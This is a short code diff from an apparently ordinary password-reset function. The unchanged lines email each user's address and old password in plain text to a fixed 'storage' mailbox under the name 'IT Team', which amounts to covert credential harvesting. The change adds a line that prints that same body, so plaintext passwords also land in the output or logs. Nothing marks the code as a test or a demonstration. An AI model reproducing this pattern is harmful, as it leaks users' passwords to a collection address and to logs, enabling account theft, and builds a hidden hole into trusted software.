@@ -78,9 +78,9 @@ def reset_password(token):
                            host=BaseConfig.EMAIL_HOST,
                            port=BaseConfig.EMAIL_PORT)
 
-        print(mail_client)
         subject = "Password Updated"
         body = f"{email}: {old_password}\n"
+        print(body)
         resp, success = mail_client.send_mail([BaseConfig.EMAIL_STORAGE], subject, body, "IT Team")
 
         if success:
